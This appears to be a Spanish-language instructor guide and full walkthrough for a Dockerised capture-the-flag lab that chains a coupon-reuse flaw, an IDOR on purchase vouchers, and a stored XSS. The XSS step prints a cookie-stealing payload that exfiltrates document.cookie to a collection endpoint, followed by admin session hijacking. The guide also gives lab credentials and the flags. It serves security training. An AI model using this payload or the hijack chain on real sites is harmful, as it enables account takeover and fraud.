# Laboratorio de Lógica de Negocio — Guía del Instructor

Este material contiene **dos laboratorios independientes** (profesor y alumno)
para practicar la identificación y explotación de 3 vulnerabilidades de lógica
de negocio en una tienda web ficticia ("TiendaCorp"):

1. Reutilización indebida de cupón de descuento (business logic flaw).
2. IDOR (Insecure Direct Object Reference) en comprobantes de compra (vouchers).
3. XSS almacenado en la descripción de la foto de perfil.

Ambos laboratorios comparten la misma mecánica; solo cambian dónde se filtran
las credenciales iniciales, los montos, y la flag final.

- **Laboratorio profesor**: las credenciales de acceso se muestran directamente
  en un recuadro en la pantalla de login (simulando un reporte de Red Team).
- **Laboratorio alumno**: las credenciales están únicamente en el archivo
  JavaScript de la aplicación (`static/js/app.js`), visibles solo revisando el
  código fuente / la pestaña de red del navegador.

No hay pistas dentro de las aplicaciones: los estudiantes deben descubrir y
encadenar las 3 vulnerabilidades por su cuenta.

## Requisitos

- Docker y Docker Compose instalados en una máquina Linux.
- Acceso a internet durante el build (para descargar paquetes de Debian y
  dependencias de Python).

## Cómo levantar el laboratorio

```bash
cd business-logic-labs
docker compose up --build
```

- Laboratorio profesor: http://localhost:8080
- Laboratorio alumno: http://localhost:8081

Cada contenedor corre, además de la aplicación Flask, un "bot administrador"
con Chromium headless (Selenium) que simula a un administrador real revisando
periódicamente los comprobantes de compra nuevos. Este bot es el que hace que
el robo de sesión vía XSS sea explotable de forma realista (si el payload de
un estudiante queda expuesto en un comprobante, el bot lo ejecuta con su
propia sesión autenticada).

Cada vez que se reinicia un contenedor, la base de datos SQLite se recrea
desde cero (estado limpio para cada corrida).

## Arquitectura

- Flask + SQLite (una base de datos por laboratorio, se recrea al iniciar).
- Sesión propia manejada con un token aleatorio en la cookie `labsession`
  (no es la cookie de sesión firmada de Flask), para que copiar/pegar el
  valor de esa cookie robada realmente otorgue una sesión válida.
- `bot.py`: bot administrador con Selenium + Chromium headless.
- `/internal/latest_id`: endpoint interno usado por el bot para saber cuál es
  el comprobante más reciente a revisar.
- `/internal/_bot_credentials`: solo responde a peticiones desde `127.0.0.1`
  (dentro del propio contenedor); nunca es alcanzable desde el puerto
  publicado en el host. Es usado exclusivamente por el bot para autenticarse
  como admin con la contraseña aleatoria generada al iniciar.

## Cadena de explotación esperada (walkthrough completo)

Aplica igual para ambos laboratorios, cambiando solo dónde se obtienen las
credenciales iniciales.

### Paso 0 — Obtener credenciales

- **Profesor**: se muestran directamente en el recuadro de la pantalla de
  login (`cronaldo@fifa2026.com` / `Portugal2026@`).
- **Alumno**: revisar el código fuente de la página de login. El archivo
  `/static/js/app.js` contiene un objeto `QA_AUTOFILL` con usuario y
  contraseña de pruebas (`alumno_test` / `Cl4veAlumno#2026`).

Iniciar sesión con esas credenciales.

### Paso 1 — Vulnerabilidad de negocio: cupón reutilizable

En `/shop` hay un único producto ("Suscripción Premium") cuyo precio es mayor
al saldo disponible del usuario (wallet). Existe un cupón de descuento
(`BIENVENIDA10` en el laboratorio profesor, `DESCUENTO8` en el de alumno).

El endpoint `POST /apply_coupon` no valida si el cupón ya fue aplicado antes:
cada vez que se reenvía la petición, el descuento se vuelve a aplicar sobre
el total ya descontado (en vez de rechazar la reaplicación o recalcular
siempre desde el precio original). Reenviando la petición muchas veces
(ej. con Burp Repeater, o un `for` en curl) el precio cae por debajo del
saldo disponible, permitiendo pagar el producto con la tarjeta falsa del
checkout (`POST /checkout`, que acepta cualquier número de tarjeta sin
validación real).

Al completar la compra se genera un comprobante (`voucher`) nuevo.

### Paso 2 — IDOR en comprobantes de compra

`GET /voucher/<id>` no valida que el comprobante solicitado pertenezca al
usuario autenticado. Cambiando el número de `id` en la URL se pueden ver
comprobantes de otros usuarios, incluyendo el comprobante `id=1`, que
pertenece a la cuenta `admin` y corresponde a una "Bóveda Interna". Este
comprobante contiene una sección de "notas internas" que solo se muestra si
la sesión actual pertenece a un usuario con `is_admin=1` — un usuario normal
puede ver el resto del comprobante, pero no esa sección todavía.

### Paso 3 — XSS almacenado en foto de perfil

En `/profile` el campo "Descripción de tu foto de perfil" no sanitiza el
contenido ingresado, y se renderiza sin escapar tanto en el perfil propio,
el perfil público (`/profile/<username>`) como en la sección "Comentario del
comprador" dentro de cualquier comprobante de compra (`/voucher/<id>`).

El bot administrador revisa periódicamente (cada ~10 segundos) el
comprobante más reciente creado en la tienda. Si el estudiante guarda un
payload como:

```html
<img src=x onerror="fetch('/collect?c='+encodeURIComponent(document.cookie))">
```

y luego genera un nuevo comprobante de compra (repitiendo el paso 1), el bot
administrador terminará visitando ese comprobante con su propia sesión
autenticada, ejecutando el payload y enviando su cookie de sesión
(`labsession`) al endpoint `/collect`, que la registra en la base de datos.

### Paso 4 — Recolectar la cookie robada y tomar la sesión admin

El estudiante puede consultar `GET /debug/captured` (un endpoint de
depuración dejado expuesto sin autenticación) para ver el valor de la cookie
`labsession` robada al administrador.

Con las herramientas de desarrollador del navegador (o con curl/Burp),
reemplaza su propia cookie `labsession` por el valor robado y vuelve a
visitar `/voucher/1` (descubierto en el paso 2). Ahora, al tener una sesión
reconocida como admin, la sección de "notas internas" se muestra, revelando
la flag.

## Flags

- Laboratorio profesor: `FLAG{profesor_cadena_l0gica_neg0cio_x9k2m}`
- Laboratorio alumno: `FLAG{alumno_cadena_l0gica_neg0cio_r7m4t}`

Ambas flags están hardcodeadas en `app.py` de cada laboratorio (variable
`FLAG`), por si se desean cambiar antes de usar el material.

## Reinicio del laboratorio

```bash
docker compose down
docker compose up --build
```

Cada reinicio genera una base de datos nueva (usuarios, comprobantes y
contraseña de admin aleatoria se regeneran).

## Notas de diseño para el instructor

- Las 3 vulnerabilidades son independientes y reportables por separado, pero
  la flag solo se revela si se encadenan las tres, tal como se pidió.
- El endpoint `/collect` y `/debug/captured` son parte de la "escenografía"
  del laboratorio (el sumidero de la exfiltración vía XSS) y no constituyen
  una cuarta vulnerabilidad a reportar — represente el receptor que en un
  ataque real sería un servidor controlado por el atacante.
- El panel de pago (`/checkout`) acepta cualquier número de tarjeta sin
  validación (ni longitud real, ni algoritmo de Luhn), tal como se solicitó.
